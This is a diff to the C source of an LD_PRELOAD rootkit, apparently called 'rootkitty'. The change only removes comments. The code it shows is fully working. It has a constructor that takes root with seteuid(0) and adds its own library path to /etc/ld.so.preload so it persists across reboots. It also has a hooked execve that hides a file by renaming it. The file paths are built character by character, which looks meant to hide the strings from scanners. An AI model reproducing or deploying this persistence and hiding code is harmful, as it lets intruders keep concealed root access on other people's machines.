@@ -41,7 +41,7 @@ __attribute__((constructor)) void PersistCheck(void) {
   FILE* temp_fd;
   Dl_info path;
   char line[255];
-  char check[PATH_MAX]; // Make sure this is enough to store the path
+  char check[PATH_MAX];
   char preload[] = { '/', 'e', 't', 'c', '/', 'l', 'd', '.', 's', 'o', '.', 'p', 'r', 'e', 'l', 'o', 'a', 'd', 0 };
   char tmp[] = { '/', 't', 'm', 'p', '/', 'r', 'o', 'o', 't', 'k', 'i', 't', 't', 'y', '_', 't', 'm', 'p', '.', 't', 'x', 't', 0 };
 
@@ -50,12 +50,10 @@ __attribute__((constructor)) void PersistCheck(void) {
   seteuid(0);
   
   if (access(preload, F_OK) == 0){
-    // file exists, check if we are already written to the file
     fd = fopen(preload, "r");
     if(fd == NULL) return;
     
     if (fgets(check, sizeof(check), fd) && strcmp(check, path.dli_fname) == 0){
-      // we are already in the file, do not write again
       fclose(fd);
       return;
     }
@@ -66,7 +64,7 @@ __attribute__((constructor)) void PersistCheck(void) {
       return;
     }
 
-    fprintf(temp_fd, "%s\n", path.dli_fname); // append the new line to separate entries
+    fprintf(temp_fd, "%s\n", path.dli_fname);
 
     while (fgets(line, sizeof(line), fd) != NULL) {
       fprintf(temp_fd, "%s", line);
@@ -76,11 +74,10 @@ __attribute__((constructor)) void PersistCheck(void) {
     fclose(temp_fd);
     rename(tmp, preload);
   } else {
-    // file doesn't exist, try to create it
     fd = fopen(preload, "w");
     if (fd != NULL) {
-      fprintf(fd, "%s\n", path.dli_fname); // append the new line for consistency
-      fclose(fd); // Close file pointer if successfully opened
+      fprintf(fd, "%s\n", path.dli_fname);
+      fclose(fd);
     }
   }
   seteuid(old_uid);
@@ -98,7 +95,7 @@ int execve(const char *pathname, char *const argv[], char *const envp[]) {
     rename(normal, hidden);  // Hide file
     sleep(2);
     rename(hidden, normal); // Restore file
-    seteuid(old_uid); // Drop the privileges back to normal
+    seteuid(old_uid);
   }
   return og_execve(pathname, argv, envp);
 }
